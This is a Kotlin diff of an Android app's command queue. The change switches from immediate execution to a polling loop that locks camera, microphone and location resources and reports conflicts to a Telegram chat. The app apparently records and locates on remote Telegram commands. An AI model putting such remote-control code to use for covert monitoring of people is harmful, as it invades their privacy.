@@ -6,14 +6,13 @@ import androidx.room.*
 import kotlinx.coroutines.*
 import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
-import org.json.JSONObject
 
 object CommandQueueManager {
     enum class ResourceGroup { CAMERA, MIC, LOCATION, NONE }
 
     private val queueScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
     private val resourceMutex = Mutex()
-    private val runningResources = mutableMapOf<ResourceGroup, String>() // Resource -> occupying command type (e.g. "video", "audio")
+    private val runningResources = mutableSetOf<ResourceGroup>()
     private val runningJobIds = mutableSetOf<Long>()
     private lateinit var appContext: Context
     private lateinit var dao: CommandQueueDao
@@ -24,54 +23,67 @@ object CommandQueueManager {
         appContext = context.applicationContext
         dao = CommandQueueDatabase.getInstance(appContext).commandQueueDao()
         initialized = true
-        // No need to start a loop: everything is now handled on enqueue and job completion.
+        queueScope.launch { processQueueLoop() }
     }
 
     fun enqueue(command: QueuedCommand) {
         queueScope.launch {
             val needed = getResourceGroups(command.type)
-            val conflicting: Pair<ResourceGroup, String>? = resourceMutex.withLock {
-                needed.firstOrNull { res ->
-                    runningResources.containsKey(res) && runningResources[res] != null
-                }?.let { res ->
-                    Pair(res, runningResources[res] ?: "")
-                }
-            }
-            if (conflicting != null) {
-                // Resource is busy, deny command and notify
-                val (res, occupyingCommand) = conflicting
-                val deviceNickname = Preferences.getNickname(appContext) ?: "Device"
-                val msg =
-                    "[$deviceNickname] Resource busy: '${res.name}' is currently used by '${occupyingCommand}'. Your '${command.type}' command was denied. Try again after the current command finishes."
-                if (!command.chatId.isNullOrBlank()) {
-                    UploadManager.init(appContext)
-                    UploadManager.sendTelegramMessage(command.chatId, msg)
-                }
-                Log.w("CommandQueueManager", msg)
-                return@launch // Do not insert into queue
-            }
-
-            // No conflicts, lock resources and start command immediately
-            val entity = CommandEntity.fromQueuedCommand(command)
-            val id = dao.insert(entity)
             resourceMutex.withLock {
-                needed.forEach { runningResources[it] = command.type }
-                runningJobIds.add(id)
-            }
-            queueScope.launch {
-                try {
-                    dao.updateStatus(id, "running")
-                    withContext(Dispatchers.IO) {
-                        ActionHandlers.executeCommand(appContext, command)
+                if (needed.any { it in runningResources }) {
+                    // Send Telegram message about resource conflict
+                    if (!command.chatId.isNullOrBlank()) {
+                        UploadManager.init(appContext)
+                        val resourceNames = needed.filter { it in runningResources }
+                            .joinToString(", ") { it.name }
+                        val deviceNickname = Preferences.getNickname(appContext) ?: "Device"
+                        val msg = "[$deviceNickname] Cannot execute '${command.type}' command because resource(s) busy: [$resourceNames]. Try again after the current command finishes."
+                        UploadManager.sendTelegramMessage(command.chatId, msg)
                     }
-                    dao.updateStatus(id, "done")
-                } catch (e: Exception) {
-                    dao.updateStatus(id, "failed")
-                    Log.e("CommandQueueManager", "Command failed: ${command.type}", e)
-                } finally {
-                    resourceMutex.withLock {
-                        needed.forEach { runningResources.remove(it) }
-                        runningJobIds.remove(id)
+                    Log.w("CommandQueueManager", "Rejected '${command.type}' due to resource conflict: $needed")
+                    return@launch
+                }
+            }
+            dao.insert(CommandEntity.fromQueuedCommand(command))
+            // processQueueLoop is always running, so nothing more needed here
+        }
+    }
+
+    private suspend fun processQueueLoop() {
+        while (true) {
+            processQueueOnce()
+            delay(250)
+        }
+    }
+
+    private suspend fun processQueueOnce() {
+        val pending = dao.getAllPending()
+        if (pending.isEmpty()) return
+
+        resourceMutex.withLock {
+            for (cmd in pending) {
+                if (runningJobIds.contains(cmd.id)) continue
+                val neededResources = getResourceGroups(cmd.type)
+                if (neededResources.any { it in runningResources }) continue
+
+                runningResources.addAll(neededResources)
+                runningJobIds.add(cmd.id)
+
+                queueScope.launch {
+                    try {
+                        dao.updateStatus(cmd.id, "running")
+                        withContext(Dispatchers.IO) {
+                            ActionHandlers.executeCommand(appContext, cmd.toQueuedCommand())
+                        }
+                        dao.updateStatus(cmd.id, "done")
+                    } catch (e: Exception) {
+                        dao.updateStatus(cmd.id, "failed")
+                        Log.e("CommandQueueManager", "Command failed: ${cmd.type}", e)
+                    } finally {
+                        resourceMutex.withLock {
+                            runningResources.removeAll(neededResources)
+                            runningJobIds.remove(cmd.id)
+                        }
                     }
                 }
             }
